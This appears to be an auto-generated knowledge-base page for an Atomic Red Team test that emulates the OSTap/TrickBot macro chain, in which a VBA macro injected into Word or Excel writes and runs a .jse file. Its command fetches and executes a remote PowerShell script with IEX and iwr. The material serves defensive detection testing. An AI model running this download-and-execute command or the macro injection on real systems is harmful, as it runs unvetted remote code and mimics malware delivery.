---
atomic_guid: "8bebc690-18c7-4549-bc98-210f7019efff"
title: "OSTap Style Macro Execution"
framework: "atomic"
generated: "true"
attack_technique_id: "T1204.002"
attack_technique_name: "User Execution: Malicious File"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1204.002/T1204.002.yaml"
build_date: "2026-04-26 17:02:12"
executor: "powershell"
aliases:
  - "8bebc690-18c7-4549-bc98-210f7019efff"
  - "OSTap Style Macro Execution"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

# OSTap Style Macro Execution

This Test uses a VBA macro to create and execute #{jse_path} with cscript.exe. Upon execution, the .jse file launches wscript.exe.
Execution is handled by [Invoke-MalDoc](https://github.com/redcanaryco/invoke-atomicredteam/blob/master/Public/Invoke-MalDoc.ps1) to load and execute VBA code into Excel or Word documents.
This is a known execution chain observed by the OSTap downloader commonly used in TrickBot campaigns.
References:
  https://www.computerweekly.com/news/252470091/TrickBot-Trojan-switches-to-stealthy-Ostap-downloader

## Metadata

- Atomic GUID: 8bebc690-18c7-4549-bc98-210f7019efff
- Technique: T1204.002: User Execution: Malicious File
- Platforms: windows
- Executor: powershell
- Dependency Executor: powershell
- Source Path: atomics/T1204.002/T1204.002.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1204-user_execution|T1204.002]]

## Input Arguments

### jse_path

- description: Path for the macro to write out the "malicious" .jse file

- type: string
- default: C:\Users\Public\art.jse

### ms_product

- description: Maldoc application Word or Excel
- type: string
- default: Word

## Dependencies

Microsoft #{ms_product} must be installed

### Prerequisite Check

```powershell
try {
  New-Object -COMObject "#{ms_product}.Application" | Out-Null
  $process = "#{ms_product}"; if ( $process -eq "Word") {$process = "winword"}
  Stop-Process -Name $process
  exit 0
} catch { exit 1 }
```

### Get Prerequisite

```powershell
Write-Host "You will need to install Microsoft #{ms_product} manually to meet this requirement"
```

## Executor

- name: powershell

### Command

```powershell
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
$macrocode = "   Open `"#{jse_path}`" For Output As #1`n   Write #1, `"WScript.Quit`"`n   Close #1`n   Shell`$ `"cscript.exe #{jse_path}`"`n"
Invoke-MalDoc -macroCode $macrocode -officeProduct "#{ms_product}"
```

### Cleanup

```powershell
Remove-Item #{jse_path} -ErrorAction Ignore
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1204.002/T1204.002.yaml)
